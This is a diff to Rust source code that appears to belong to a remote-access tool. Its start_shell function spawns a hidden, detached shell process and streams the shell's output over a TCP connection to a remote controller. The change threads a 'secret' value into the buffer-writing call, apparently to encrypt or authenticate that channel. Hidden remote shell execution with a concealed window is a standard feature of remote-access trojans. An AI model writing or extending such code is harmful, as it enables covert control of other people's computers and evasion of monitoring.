@@ -7,7 +7,7 @@ use std::sync::{ Arc, Mutex };
 use common::buffers::{ read_console_buffer, write_buffer };
 use common::commands::Command;
 
-pub fn start_shell(write_stream: Arc<Mutex<TcpStream>>, remote_shell: &mut Option<Child>) {
+pub fn start_shell(write_stream: Arc<Mutex<TcpStream>>, remote_shell: &mut Option<Child>, secret: &Option<Vec<u8>>) {
     const DETACH: u32 = 0x00000008;
     const HIDE: u32 = 0x08000000;
 
@@ -21,6 +21,8 @@ pub fn start_shell(write_stream: Arc<Mutex<TcpStream>>, remote_shell: &mut Optio
             .spawn()
             .unwrap()
     );
+
+    let secret = secret.clone();
 
     if let Some(shell) = remote_shell {
         if let Some(stdout) = shell.stdout.take() {
@@ -37,7 +39,8 @@ pub fn start_shell(write_stream: Arc<Mutex<TcpStream>>, remote_shell: &mut Optio
                                 let mut ws_lock = write_stream.lock().unwrap();
                                 write_buffer(
                                     &mut ws_lock,
-                                    Command::ShellOutput(cmd_buffer.to_string())
+                                    Command::ShellOutput(cmd_buffer.to_string()),
+                                    &secret
                                 );
                                 cmd_buffer.clear();
                             }
